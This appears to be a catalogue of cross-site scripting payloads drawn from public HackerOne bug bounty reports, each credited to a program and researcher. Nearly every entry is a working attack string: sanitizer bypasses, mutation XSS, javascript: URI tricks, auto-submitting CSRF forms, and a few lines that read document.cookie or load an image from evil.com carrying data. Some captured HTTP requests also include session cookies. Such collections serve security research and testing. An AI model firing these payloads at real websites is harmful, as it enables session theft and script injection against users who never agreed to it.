— [Image queue default key of 'None' and GraphQL unhandled type exception](https://hackerone.com/reports/996041) · Reddit · [moblig](https://hackerone.com/moblig) · $500.0


## JavaScript URL injection in markdown link

### `ae0597ef`

```
[<script>alert`link text`</script>](a)

[click](javascript:alert`javascript_scheme`)

[onmouseover](http://"/onmouseover="alert`on_mouse_link`")

[link_image](http://"onerror="alert`link_image`".png)
```

— [XSS in HTML generated by RDoc](https://hackerone.com/reports/1187156) · Ruby · [ooooooo_q](https://hackerone.com/ooooooo_q)


## JavaScript URL injection via window.open to execute alert

### `6e113c39`

```
window.open("javascript:window.opener.alert('bored-engineer')")
```

— [XSS in $shop$.target.com/admin/ via "Button Objects" in malicious app](https://hackerone.com/reports/217745) · Shopify · [bored-engineer](https://hackerone.com/bored-engineer) · $800.0


## JavaScript URL XSS via crafted JSON field 'url' using a javascript: scheme with newline-encoded alert

### `d1bfb0e1`

```
{
"url":"javascript://test%0aalert(document.domain)"
}
```

— [Stored XSS in Elastic App Search](https://hackerone.com/reports/846905) · Elastic · [iamnoooob](https://hackerone.com/iamnoooob) · $2,000.0


## JavaScript URL XSS via RSS <link> element

### `37b05df8`

```
<entry>
  <title>XSS</title>
  <link rel="alternate" type="text/html" href="javascript:alert(document.domain)" />
  <content type="html"><![CDATA[<img src="https://target.com/test.png">]]></content>
</entry>
```

— [XSS on Brave Today through custom RSS feed](https://hackerone.com/reports/1184379) · Brave Software · [nishimunea](https://hackerone.com/nishimunea) · $500.0


## JSON/JavaScript injection via script tag in a JSON field

### `13460e9a`

```
YUI.namespace('Env.DATA').consumer = {"uuid":"</script><script src=//target.com/z0i2sU>","firstName":null,
```

**Parameter:** `uuid`
— [Ability to create own account UUID leads to stored XSS](https://hackerone.com/reports/249131) · Upserve  · [cache-money](https://hackerone.com/cache-money) · $1,500.0


## JSON key injection using </script><script> to break out of a script context (XSS)

### `11db8b9c`

```
{"</script><script>alert(1)//"=>"xss"}
```

— [JSON keys are not properly escaped](https://hackerone.com/reports/47280) · Ruby on Rails · [einstein_](https://hackerone.com/einstein_)


## JSON payload injection with a javascript: URI in a link field causing XSS

### `9acf956a`

```
{"type":"rocket","event":"rocket","payload":{"mm":[["fi",[],3,{"type":"unfurl","originalFragment":{"_bindings":{"attach":[[]],"mutation:post":[[]],"attached":[[]],"detach":[[]],"detached":[[]]},"_bindingLock":0,"_customData":[],"_data":{"type":"p","text":"javascript:alert(document.domain%29","tabbing":0,"links":{"javascript:alert(\"XSS\"%29":[0,22]},"formats":[]},"_dom":null,"_mutable":{"_lock":0},"_mutableGuard":{"_lock":0},"_parent":null,"_text":"javascript:alert(\"XSS\"%29","_tabbing":0,"_lin
```

— [Stored XSS on target.com using new Markdown editor of posts inside the Editing mode and using javascript-URIs](https://hackerone.com/reports/132104) · Slack · [fransrosen](https://hackerone.com/fransrosen)


## JSON response injection leading to XSS via script tag in authorize_url field

### `3479adc6`

```
{
        "authorize_url": "'><script>alert(document.domain);</script>",
        "stage": "authorize",
        "user": {
          "name": "nombre",
          "extraTm2z": 1
       },
       "origin": ""
     }
```

— [XSS on target.com/authorize/ because of open redirect at /core/oauth/auth](https://hackerone.com/reports/143240) · Mapbox · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)


## JSONP XSS payload that returns a script executing alert(document.domain)

### `24729fc1`

```
<?
header("Access-Control-Allow-Origin: *");
?>
alert(document.domain)
```

— [Stealing contact form data on target.com using Marketo Forms XSS with postMessage frame-jumping and jQuery-JSONP](https://hackerone.com/reports/207042) · HackerOne · [fransrosen](https://hackerone.com/fransrosen)


## Lodash _.template injection leading to XSS via a data-define attribute

### `ab3b40fd`

```
'-alert(document.domain)-'
```

**Parameter:** `value`
— [XSS in $shop$.target.com/admin/ via twine template injection in "Shopify.API.Modal.input" method when using a malicious app](https://hackerone.com/reports/217790) · Shopify · [bored-engineer](https://hackerone.com/bored-engineer) · $1,000.0


## Login CSRF and open redirect using a malicious HTML page with an iframe and JavaScript redirect

### `bddb6f8e`

```
<html>
<body>
	<iframe id="login_csrf_frame" src="████████" style="width:0;height:0;border:0;border:none;"></iframe>
	<script>
		setTimeout(function(){document.location.href = "https://target.com/users/saml/sign_in?email=████&remember_me=true";}, 5000);
	</script>
</body>
</html>
```

— [(HackerOne SSO-SAML) Login CSRF, Open Redirect, and Self-XSS Possible Exploitation](https://hackerone.com/reports/171398) · HackerOne · [whhackersbr](https://hackerone.com/whhackersbr)


## Malformed conditional comment injection leading to image onerror JavaScript execution

### `040f314d`

```
<![endif]-- onerror="<![endif]-->" onload="<img src=1 onerror='alert(1)' />">
```

— [Email templates XSS by filterXSS bypass](https://hackerone.com/reports/1404804) · Judge.me  · [caue](https://hackerone.com/caue) · $1,250.0


## Malformed HTML with <option><style> and <img onerror> to trigger XSS

### `22a27ec2`

```
<option><style></option></select><img src=x onerror=alert(1)></style>
```

— [CVE-2020-11022](https://hackerone.com/reports/1812768) · Reddit · [greymanx1](https://hackerone.com/greymanx1)


## Malicious filename containing an onmouseover attribute for XSS

### `929916ec`

```
" onmouseover=alert('xss') "
```

— [\[seeftl\] Stored XSS when directory listing via filename.](https://hackerone.com/reports/665302) · Node.js third-party modules · [luizviana](https://hackerone.com/luizviana)


## Malicious HTML file upload leading to stored XSS

### `3cd4d99f`

```
POST /api/files.uploadAsync HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Length: 886
Content-Type: multipart/form-data; boundary=---------------------------89481407720596
Origin: https://<subdomain>.evil.com
Connection: keep-alive

-----------------------------89481407720596
Content-Disposition: 
```

**Parameter:** `file`
— [Open Redirect on target.com](https://hackerone.com/reports/140447) · Slack · [sudotop](https://hackerone.com/sudotop) · $500.0


## Markdown image XSS with onload attribute executing alert(1)

### `4b59f1ff`

```
![xss" onload=alert(1);//](a)
```

**Parameter:** `description`
— [Stored XSS on Issue details page](https://hackerone.com/reports/384255) · GitLab · [8ayac](https://hackerone.com/8ayac)


## Markdown link with malicious href using dot‑prefixed payload that becomes a javascript: URI

### `2adae9d4`

```
[XSS](.alert(1);)
```

**Parameter:** `content`
— [Stored XSS in Wiki pages](https://hackerone.com/reports/526325) · GitLab · [ryhmnlfj](https://hackerone.com/ryhmnlfj)


## Math element with <style> containing <img onerror> XSS (style tag injection)

### `4a99d94b`

```
<math><style><img src=x onerror=alert(1)></style></math>
```

— [Rails::Html::SafeListSanitizer vulnerable to XSS when certain tags are allowed (math+style || svg+style)](https://hackerone.com/reports/1656627) · Ruby on Rails · [0b5cur17y](https://hackerone.com/0b5cur17y)


## Mutation XSS using MathML elements with onerror image

### `645664e8`

```
<math><mtext><table><mglyph><style><img src=x onerror=alert()></style>
```

— [Mutation Based Stored XSS on Trix Editor version latest (2.1.8)](https://hackerone.com/reports/2819573) · Basecamp · [sudi](https://hackerone.com/sudi)


## Mutation XSS via Trix editor data‑trix‑attachment attribute with onerror image

### `b3ef3602`

```
copy<div data-trix-attachment="{&quot;contentType&quot;:&quot;text/html5&quot;,&quot;content&quot;:&quot;&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;img src=x onerror=alert()&gt;&lt;/style&gt;XSS POC&quot;}"></div>me
```

— [Mutation Based Stored XSS on Trix Editor version latest (2.1.8)](https://hackerone.com/reports/2819573) · Basecamp · [sudi](https://hackerone.com/sudi)


## Nested <script> inside <style> within <select> bypassing HTML sanitizer (XSS)

### `dba40ea4`

```
<select><style><script>alert(1)</script></style></select>
```

— [Rails::Html::SafeListSanitizer vulnerable to xss attack in an environment that allows the style tag](https://hackerone.com/reports/1599573) · Internet Bug Bounty · [windshock](https://hackerone.com/windshock) · $2,400.0


## Obfuscated JavaScript URI (javascripT://) for XSS bypass

### `afc1293a`

```
javascripT://
```

— [Stored XSS in the Custom Logo link (non-Basic plan required)](https://hackerone.com/reports/282209) · Infogram · [sp1d3rs](https://hackerone.com/sp1d3rs)


## Obfuscated javascript: URI with newline characters in href for XSS

### `a8aa7217`

```
<a+href="ja%0A%0Dvascript:alert(document.domain)">Click</a>
```

**Parameter:** `keyword`
— [Reflected XSS  www.█████ search form](https://hackerone.com/reports/1012249) · U.S. Dept Of Defense · [val_brux](https://hackerone.com/val_brux)


## onerror attribute XSS using malformed <img> tag

### `8ebb91af`

```
<img/src="0"onerror="alert(0)">
```

— [Stored-XSS injected in Wiki page via Banzai pipeline](https://hackerone.com/reports/2257080) · GitLab · [yvvdwf](https://hackerone.com/yvvdwf)


## onerror attribute XSS using standard <img> tag

### `c0aee335`

```
<img src="0" onerror="alert(0)">
```

— [Stored-XSS injected in Wiki page via Banzai pipeline](https://hackerone.com/reports/2257080) · GitLab · [yvvdwf](https://hackerone.com/yvvdwf)


## onerror XSS via custom emoji URL field in GraphQL mutation

### `8db799b3`

```
mutation {
  createCustomEmoji(input: 
    {
      groupPath: "xss_target", 
      name:"xssreplace",
      url:"http://aaa#'><img onerror=alert(location) src=.>"
    }) {
    customEmoji {
      id
      name
      url
    }
  }
}
```

**Parameter:** `url`
— [Stored XSS in custom emoji](https://hackerone.com/reports/1198517) · GitLab · [ooooooo_q](https://hackerone.com/ooooooo_q) · $3,000.0


## Onerror XSS using Unicode characters to bypass HTML entity encoding

### `7bf2a0a4`

```
†‡•＜img src=a onerror=javascript:alert('hacked')>…‰€
```

— [Stored XSS in profile activity feed messages](https://hackerone.com/reports/231444) · Rockstar Games · [alexbirsan](https://hackerone.com/alexbirsan) · $1,000.0


## Using an onload attribute with print`` to execute JavaScript (onload XSS bypassing WAF)

### `0a223313`

```
Payload used: (Z('ontestingb3t2h onload=print`` fnwve='zzzzz`8504695818`'))
- This payload successfully triggered JavaScript execution using the onload attribute.
- The use of print`` instead of alert()` was necessary to bypass Web Application Firewall (WAF) protections and filter-based sanitization.
```

— [Cross-Site Scripting (XSS) in target.com via ResolveUrl on ████ ](https://hackerone.com/reports/3166579) · U.S. Dept Of Defense · [jonasdiasrebelo](https://hackerone.com/jonasdiasrebelo)


## Open redirect with CRLF injection leading to reflected XSS via injected <body onload> tag

### `9be75863`

```
https://target.com/searchasyoutype/v1/search?x-api-key=██████&query=coffe&partnerid=███████:vwt2u5wngbk&siteBaseUrl=http://evil.com/%0a<body
```

**Parameter:** `siteBaseUrl`
— [Reflected XSS in target.com /searchasyoutype/v1/search?x-api-key=](https://hackerone.com/reports/213190) · Starbucks · [an0n-j](https://hackerone.com/an0n-j)


## Open redirect leading to JavaScript URI XSS

### `6c627186`

```
https://target.com/web/sign-inhttps://target.com/javascript:alert(1
```

— [\[target.com\] XSS and Open Redirect Protection Bypass](https://hackerone.com/reports/330008) · X / xAI · [bywalks](https://hackerone.com/bywalks) · $1,120.0


## Open‑redirect leading to reflected XSS via JavaScript URI in redirect_uri parameter

### `de2e982b`

```
https://target.com:443/mod/lti/auth.php?redirect_uri=javascript:alert(document.domain
```

**Parameter:** `redirect_uri`
— [Moodle XSS on  target.com](https://hackerone.com/reports/1165540) · Glovo · [sn3akysnak3](https://hackerone.com/sn3akysnak3)


## Open redirect / XSS using HTML meta refresh to a malicious OAuth URL

### `9225c2fa`

```
<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;https://target.com/oauth/authenticate?oauth_token=████████"></head></html>
```

— [Account Takeover in Periscope TV](https://hackerone.com/reports/317476) · X / xAI · [ngalog](https://hackerone.com/ngalog)


## Open‑redirect XSS via javascript: URI in redirect_url parameter

### `af83d205`

```
http://localhost:3000/vuln?redirect_url=javascript:alert()%08
```

**Parameter:** `redirect_url`
— [Incorrect handling of certain characters passed to the redirection functionality in Rails can lead to a single-click XSS vulnerability.](https://hackerone.com/reports/1955370) · Ruby on Rails · [meowday](https://hackerone.com/meowday)


## Partial <script string injection in spreadsheet cell to bypass filters and trigger XSS

### `5ab93778`

```
<script
```

— [\[exceljs\] Possible XSS via cell value when worksheet is displayed in browser](https://hackerone.com/reports/356809) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)


## Polyglot XSS payload combining img onerror, script tag, iframe onload, svg onload, and input onfocus

### `9dddf33a`

```
"'><img src=a onerror=confirm(2)>"><script>alert(1);</script><iframe onload=alert(97)>"><svg onload=alert(2);>"onmouseover="confirm(2);<input onfocus=prompt(1) autofocus>"--> </script><svg/onload=';alert(/XSSPOSED/);'>"
```

— [XSS in L.mapbox.shareControl in mapbox.js](https://hackerone.com/reports/99245) · Mapbox · [enderun07](https://hackerone.com/enderun07) · $1,000.0


## postMessage XSS using a javascript: URL to set window location

### `a0f7616a`

```
$$('iframe')[0].contentWindow.postMessage('{"message":"Shopify.API.setWindowLocation","data":"javascript:alert(document.domain);0[0]"}','*')
```

— [H1514 DOMXSS on Embedded SDK via Shopify.API.setWindowLocation abusing cookie Stuffing](https://hackerone.com/reports/422043) · Shopify · [filedescriptor](https://hackerone.com/filedescriptor)


## Prototype pollution via __proto__ injection leading to XSS

### `65d0ad3a`

```
]=alert(document.domain)
```

— [Prototype Pollution leads to XSS on https://target.com/#__proto__\[asd\]=alert(document.domain)](https://hackerone.com/reports/998398) · Elastic · [s1r1u5](https://hackerone.com/s1r1u5)


## RDoc linkable image syntax to embed a malicious image

### `34af673c`

```
{<img src>}[link]
```

— [Cross-site Scripting (XSS) - Stored in RDoc wiki pages](https://hackerone.com/reports/662287) · GitLab · [vakzz](https://hackerone.com/vakzz) · $3,500.0


## RDoc markup injection using script tags in rdoc-image/label constructs

### `ccb31a07`

```
rdoc-image:"><script>alert(`rdoc-image`)</script>"

rdoc-label::path::"><script>alert(`rdoc-label_id`)</script>"

rdoc-label::"><script>alert(`rdoc-label_path`)</script>"

rdoc-ref:"><script>alert(`rdoc-ref`)</script>"

rdoc-xxx:"><script>alert(`rdoc-xxx`)</script>"
```

— [XSS in HTML generated by RDoc](https://hackerone.com/reports/1187156) · Ruby · [ooooooo_q](https://hackerone.com/ooooooo_q)


## Reflected Cross‑Site Scripting (XSS) via injection in a query parameter

### `906333c4`

```
?█████=';}alert("chron0x"); function clickit(){//
```

— [Reflected XSS on █████████](https://hackerone.com/reports/1059395) · U.S. Dept Of Defense · [0x0d0](https://hackerone.com/0x0d0)


## Reflected DOM‑based XSS via unsanitized search query parameter `s` injecting a script tag

### `6e9b6f30`

```
https://██████/?s=%27%3E%3Cscript%3Ealert(document.domain
```

**Parameter:** `s`
— [\[█████\] — DOM-based XSS on endpoint `/?s=`](https://hackerone.com/reports/708592) · U.S. Dept Of Defense · [usamasood](https://hackerone.com/usamasood)


## Reflected DOM XSS by injecting a closing quote and HTML tag

### `1908bd41`

```
5. At the end of the URL (at the end of the &so=&o=) write 1"><h1>DOM XSS by c0mbo</h1>
```

**Parameter:** `o`
— [\[redacted\]](https://hackerone.com/reports/1194301) · Lab45 · [c0mbo](https://hackerone.com/c0mbo)


## Reflected DOM XSS via query‑parameter injection (onerror attribute payload)

### `3e11da36`

```
https://target.com/ext/jquery/dist/jquery.min.js?c=%22%3E%0D%0A%0D%0A%3Cx%20%27=%22foo%22%3E%3Cx%20foo=%27%3E%3Cimg%20src=x%20onerror=javascript:alert(
```

**Parameter:** `c`
— [WAF bypass and java script incomplete handling of Unicode characters might leads to dom-xss](https://hackerone.com/reports/2921905) · Doppler · [clubbable](https://hackerone.com/clubbable)


## Reflected XSS via alert(0) injection in the search parameter

### `54411a29`

```
2. Enter this in the search: ``      -alert(0)-    ``or simply visit: ██████
```

**Parameter:** `search`
— [XSS on ███](https://hackerone.com/reports/3053220) · U.S. Dept Of Defense · [bewgsy](https://hackerone.com/bewgsy)


## Reflected XSS via crafted query parameter value

### `873aecc5`

```
<html>
<body>
<script>
	window.onload = function(){document.forms['XSS'].submit();}
</script>
	<form id='XSS' action='https://█████████/web/guest/search' method='post'>
		<input type='text' name='query' value="'};alert('XSS');var x={y:'">
	</form>
</body>
</html>
```

**Parameter:** `query`
— [XSS found for https://█████████](https://hackerone.com/reports/2670521) · U.S. Dept Of Defense · [thpless](https://hackerone.com/thpless)


## Reflected XSS via crafted URL path that injects HTML/JS (onerror) payload

### `d850b07e`

```
https://target.com/album/image/679/1139%22%3E%3Ch1%3ESurprise!%3Cimg%20src=0%20onerror=%22alert(document.domain
```

— [Album image XSS](https://hackerone.com/reports/17235) · Uzbey · [bitquark](https://hackerone.com/bitquark)


## Reflected XSS via direct <script> tag injection

### `28cb6d15`

```
<script>alert('AppleBois');</script>
```

— [Stored XSS on 1.4.0](https://hackerone.com/reports/1331281) · ImpressCMS · [tehwinsam](https://hackerone.com/tehwinsam)


## Reflected XSS using an encoded <img> tag with onerror attribute

### `9531ea8b`

```
<img src=%3d onerror%3dalert(document.cookie)
```

— [Reflected XSS via `████████` parameter](https://hackerone.com/reports/1536215) · U.S. Dept Of Defense · [mdakh404](https://hackerone.com/mdakh404)


## Reflected XSS via encoded payload in serial parameter

### `df1289b3`

```
PoC 1:
http://target.com/files/glidownload/verify3.asp?version=CC1100x7660&serial=%3Ch1+onmouseover=[][%22\146\151\154\164\145\162%22][%22\143\157\156\163\164\162\165\143\164\157\162%22](%22\141\154\145\162\164\50\144\157\143\165\155\145\156\164\056\144\157\155\141\151\156\51%22)()%3Etest%3C/h1%3E

PoC 2:
http://target.com/files/glidownload/verify3.asp?version=CC1100x7660&serial=%3Cimg+src=x+onerror=[][%22\146\151\154\164\145\162%22][%22\143\157\156\163\164\162\165\143\164\157\16
```

**Parameter:** `serial`
— [Reflected Cross Site Scripting at http://target.com/files/glidownload/verify3.asp \[Uppercase Filter Bypass\]](https://hackerone.com/reports/1167034) · Acronis · [ub3rsick](https://hackerone.com/ub3rsick)


## Reflected XSS via encoded <script> tags in a URL parameter

### `5f480991`

```
https://target.com/support/&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;
https://evil.com/&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;
https://evil2.com/tr/&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;
```

— [Follow Button XSS](https://hackerone.com/reports/172574) · Automattic · [bobrov](https://hackerone.com/bobrov)


## Reflected XSS via errmsg query parameter

### `25149479`

```
https://102.176.160.119:10443/remote/error?errmsg=--%3E%3Cscript%3Ealert(document.domain
```

**Parameter:** `errmsg`
— [Reflected cross site scripting (XSS) attacks Reflected XSS attacks, ](https://hackerone.com/reports/1799197) · MTN Group · [0xmr_b4rayz](https://hackerone.com/0xmr_b4rayz)


## Reflected XSS using a hidden 'name' input containing an onfocus attribute payload.

### `4f76b69f`

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://████/contact-us/" method="POST">
      <input type="hidden" name="name" value="&quot;&#32;onfocus&#61;alert&#40;&apos;tmz900&apos;&#41;&#32;autofocus&#47;&#47;&quot;" />
      <input type="hidden" name="email" value="test&#64;gmail&#46;com" />
      <input type="hidden" name="phone" value="1234567895" />
      <input type="hidden" name="message" v
```

**Parameter:** `name`
— [RXSS on ███████](https://hackerone.com/reports/1626962) · U.S. Dept Of Defense · [tmz900](https://hackerone.com/tmz900)


## Reflected XSS via HTML-encoded <script> tag injection in the emailbody parameter

### `71f13a73`

```
emailbody=0xd3adc0de%26lt;ScRiPt%26gt;alert(%27XSS%20Success!%27)%26lt;/sCripT%26gt;
```

**Parameter:** `emailbody`
— [Reflected XSS in ██████](https://hackerone.com/reports/1873655) · U.S. Dept Of Defense · [0xd3adc0de](https://hackerone.com/0xd3adc0de)


## Reflected XSS using HTML‑entity encoded <script> tag in emailbody

### `1b8791a8`

```
0xd3adc0de&lt;ScRiPt&gt;alert('XSS Success!')&lt;/sCripT&gt;
```

**Parameter:** `emailbody`
— [Reflected XSS in ██████](https://hackerone.com/reports/1873655) · U.S. Dept Of Defense · [0xd3adc0de](https://hackerone.com/0xd3adc0de)


## Reflected XSS via HTML tag and SVG onload event injection

### `e9d32f12`

```
"--><%2Fscript><svg%2Fonload%3D'%3Balert(document.domain)%3B'>
```

**Parameter:** `category`
— [Reflected XSS in Zomato Mobile - category parameter](https://hackerone.com/reports/230119) · Eternal · [harrymg](https://hackerone.com/harrymg)


## Reflected XSS via an <iframe> onload attribute executing JavaScript

### `1f683d81`

```
<iframe onload=alert(document.domail)>
```

— [Stored Xss On "https://target.com/"](https://hackerone.com/reports/1901706) · target.com · [vidaamuyarchi](https://hackerone.com/vidaamuyarchi)


## Reflected XSS using image tag injection via JSONP callback parameter

### `7b826531`

```
https://target.com/php/instagram_tag_relay?callback=><img+src%3dhttps%3a//evil.com/%3f
```

**Parameter:** `callback`
— [Reflected Cross-Site Scripting in target.com/php/instagram_tag_relay](https://hackerone.com/reports/138262) · Eternal · [dejavuln](https://hackerone.com/dejavuln)


## reflected XSS via img onload injection in comment content

### `dd2708eb`

```
<img src="https://target.com/images/a-addblog.png" onload="alert()">
```

— [Stored XSS in Intense Debate comment system](https://hackerone.com/reports/1039750) · Automattic · [hundredpercent](https://hackerone.com/hundredpercent)


## Reflected XSS via injected <img onerror> in 'atb' query parameter

### `c16117b4`

```
https://target.com/50x.html?e=&atb=test%22/%3E%3Cimg%20src=x%20onerror=alert(%27test%27
```

**Parameter:** `atb`
— [DOM XSS on 50x.html page on target.com](https://hackerone.com/reports/426275) · DuckDuckGo · [smither](https://hackerone.com/smither)


## Reflected XSS by injecting `["broook"].map(alert)` into a JavaScript object via the `q` query parameter

### `b623602c`

```
<script type="text/javascript">

var pageProduct = null;
window.onload = function(e){ 
		
		Analytics.trackEvent('SEARCHRETURNED', {internalSearchTerm: "" , internalSearchTerm: ["broook"].map(alert) , numOfSearchResultsReturned: "b" , numOfSearchResultsReturned: 1});
	
}
</script>
```

**Parameter:** `q`
— [reflected XSS in \[target.com\]](https://hackerone.com/reports/1818172) · Equifax-vdp · [abdoubouanik](https://hackerone.com/abdoubouanik)


## Reflected XSS injecting 'document.cookie' to steal cookies

### `d647b47b`

```
document.cookie
```

— [XSS on ███](https://hackerone.com/reports/3053220) · U.S. Dept Of Defense · [bewgsy](https://hackerone.com/bewgsy)


## Reflected XSS by injecting escaped HTML/JS in the '-back' query parameter

### `e134d983`

```
https://target.com/en-us/profile/login.html?-back=\u0022\u003e\u003cimg+src=x+onerror=alert(1)\u003e\u003cx+y=\u0022
```

**Parameter:** `-back`
— [XSS on https://target.com/](https://hackerone.com/reports/979204) · Acronis · [yash_](https://hackerone.com/yash_)


## Reflected XSS by injecting HTML/JS into the "query[]" search parameter

### `53b66143`

```
<span data-reactid=".255dmgqjchs.1.1.1.2.1.0.0">You searched for <strong>secalert"/><marquee onstart=alert(document.domain)></strong>.</span>
```

**Parameter:** `query[]`
— [XSS in https://target.com/courses/](https://hackerone.com/reports/127163) · Coursera · [secalert](https://hackerone.com/secalert)


## Reflected XSS by injecting JavaScript in the 'c' query parameter of the SockJS endpoint

### `e77253b6`

```
https://target.com/sock/1/0/0/0/htmlfile?c=alert(
```

**Parameter:** `c`
— [Reflected XSS due to vulnerable version of sockjs](https://hackerone.com/reports/1100326) · Automattic · [chip_sec](https://hackerone.com/chip_sec)


## Reflected XSS by injecting `[7].map(alert)` into a JavaScript object via the `search` query parameter

### `3bbb8270`

```
<script type="text/javascript">
	      window.onload = function(e){
	          Analytics.trackEvent('SEARCHRETURNED',{internalSearchTerm: "" , internalSearchTerm: [7].map(alert) , numOfSearchResultsReturned: "b" , numOfSearchResultsReturned: 167});            	
	               	}
	     </script>
```

**Parameter:** `search`
— [reflected XSS in \[target.com\]](https://hackerone.com/reports/1818163) · Equifax-vdp · [abdoubouanik](https://hackerone.com/abdoubouanik)


## Reflected XSS by injecting onmouseover attribute into the "bbp_user" (nickname) field

### `4ab98ee5`

```
user1"onmouseover="alert(1);remove()"style="position:absolute;left:0;top:0;margin-top:-100%;margin-left:-100%;width:5000px;height:5000px"
```

**Parameter:** `bbp_user`
— [\[bbPress\] Stored XSS in any forum post.](https://hackerone.com/reports/151117) · Automattic · [psych0tr1a](https://hackerone.com/psych0tr1a)


## Reflected XSS via injection of <img onerror> payload in folder name

### `3bcff9b6`

```
"'><img src=x onerror=prompt(1)>
```

**Parameter:** `name`
— [CSRF leads to a stored self xss](https://hackerone.com/reports/323005) · Imgur · [hogarth45](https://hackerone.com/hogarth45)


## Reflected XSS via injection into x-prepay query parameter

### `9dbeddd6`

```
https://target.com/buynow-webkhaleesio2-ppg?lang=fr&x-prepay=xxxxxxxx'"><svg/onload=alert(document.cookie)>
```

**Parameter:** `x-prepay`
— [Reflected xss on target.com](https://hackerone.com/reports/787054) · Clario · [dilawer](https://hackerone.com/dilawer) · $50.0


## Reflected XSS via injection of JavaScript alert into serendipity[filter][author] parameter

### `93d37d33`

```
1. Access                                                                          ]=admin&serendipity[adminModule]=entries&serendipity[adminAction]=editSelect&serendipity[filter][author]=1xx");alert(document.domain);// while being authenticated;
```

**Parameter:** `serendipity[filter][author]`
— [Reflected Cross-Site Scripting in Serendipity (serendipity.SetCookie)](https://hackerone.com/reports/373950) · Hanno's projects · [bb9866f3f743d6bf69b6836](https://hackerone.com/bb9866f3f743d6bf69b6836)


## Reflected XSS via injection in the "language_id" parameter of an iframe src URL

### `8aa85c53`

```
<html>
    <body>
        <iframe src="https://target.com/widgets/res_search_widget.php?city_id=273&language_id=%22%7D%27)%3Balert(document.domain)%3Bconsole.log(%27&theme=blue&hideCitySearch=on&hideResSearch=on&sort=popularity" style="position:relative;width:100%;height:100%;" border="0" frameborder="0"></iframe>
    </body>
</html>
```

**Parameter:** `language_id`
— [XSS via modified Zomato widget (res_search_widget.php)](https://hackerone.com/reports/115402) · Eternal · [pr0tagon1st](https://hackerone.com/pr0tagon1st)


## Reflected XSS via injection of an onclick attribute in the fld_displaytype parameter

### `76b5cda8`

```
fld_displaytype=S"%20accesskey%3d"X"%20onclick%3d"alert('XSS Success!')
```

**Parameter:** `fld_displaytype`
— [\[XSS\] Reflected XSS via POST request](https://hackerone.com/reports/1850235) · U.S. Dept Of Defense · [0xd3adc0de](https://hackerone.com/0xd3adc0de)


## Reflected XSS via injection of an onfocus attribute in the 'name' form field.

### `3b892181`

```
POST /contact-us/ HTTP/1.1
Host: ███████
Cookie: wire=kh92hb67grih1376an7igoeo39; _ga_877MBKEB9K=GS1.1.1657044258.1.1.1657044351.0; _ga=GA1.2.58467857.1657044259; __atuvc=2%7C27; __atuvs=62c47d237cd3f8d9001; __atrfs=ab/|pos/|tot/|rsi/62c47d0400000000|cfc/|hash/0|rsiq/|fuid/d2cfdda4|rxi/|rsc/addressbar|gen/1|csi/|dr/; _gid=GA1.2.2089900381.1657044260; wires=cqr7lhfhfudpdntime6mevkslt; _gat_gtag_UA_377760_26=1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0
Accep
```

**Parameter:** `name`
— [RXSS on ███████](https://hackerone.com/reports/1626962) · U.S. Dept Of Defense · [tmz900](https://hackerone.com/tmz900)


## Reflected XSS via injection in query parameter 'payload'

### `e2bc58ec`

```
http://...?payload=something="something"><img src="/nonexistent" onerror="alert(1)"><div class
```

**Parameter:** `payload`
— [XSS vulnerabilities due to missing checks in tag helpers](https://hackerone.com/reports/1444151) · Ruby on Rails · [amartinfraguas](https://hackerone.com/amartinfraguas)


## Reflected XSS via injection of <script>alert(1)</script> into the PHPSESSID GET parameter

### `0eac7df2`

```
curl "https://target.com/content/search.php?PHPSESSID=\">XSSHERE<script>alert(1)</script>"|grep XSS
```

**Parameter:** `PHPSESSID`
— [target.com: Multiple reflected XSS by insecure URL generation (IE only)](https://hackerone.com/reports/83381) · ownCloud · [psych0tr1a](https://hackerone.com/psych0tr1a)


## Reflected XSS via JavaScript prompt injection in the 'q' query parameter

### `46c410b7`

```
https://target.com/blogsearch?q=OnMoUsEoVeR=prompt(/hacked/)//
```

**Parameter:** `q`
— [XSS  at https://target.com/blogsearch](https://hackerone.com/reports/1145162) · Shopify · [zqgnd](https://hackerone.com/zqgnd)


## Reflected XSS via 'lang' query parameter containing script tags

### `d12d0f88`

```
http://target.com/JPBC/login.hbc?lang=%3C/SCRIPT%3E%3CSCRIPT%3Ealert(document.domain);%3C/SCRIPT%3E
```

**Parameter:** `lang`
— [RXSS in http://target.com](https://hackerone.com/reports/831803) · Informatica · [min4tor](https://hackerone.com/min4tor)


## Reflected XSS via malformed URL injecting alert(document.domain) through the section parameter

### `a1a4a1b1`

```
https://target.com/musicstore?section=%27-alert(document.domain
```

**Parameter:** `section`
— [Reflected XSS on target.com/musicstore](https://hackerone.com/reports/85615) · Vimeo · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)


## Reflected XSS via malicious txHash query parameter

### `3b0a4ff7`

```
https://target.com/?txHash=qwqwq%3C%20SRC=%22jav&#x0D;ascript:alert(0
```

**Parameter:** `txHash`
— [Html injection target.com](https://hackerone.com/reports/324548) · MyCrypto · [w2w](https://hackerone.com/w2w)


## Reflected XSS via malicious X-Forwarded-Host header

### `07c785a9`

```
GET /?xx HTTP/1.1
Host: target.com
X-Forwarded-Host: cacheattack'"><script>alert(document.domain)</script>
```

**Parameter:** `X-Forwarded-Host`
— [Web Cache Deception Attack (XSS)](https://hackerone.com/reports/394016) · Discourse · [bobrov](https://hackerone.com/bobrov) · $256.0


## Reflected XSS using a <marquee> tag with an onfinish event that runs JavaScript

### `5a141aca`

```
<marquee loop%3d1 width%3d0 onfinish%3dco\u006efirm(document.cookie)>XSS<%2fmarquee>
```

**Parameter:** `error_hint`
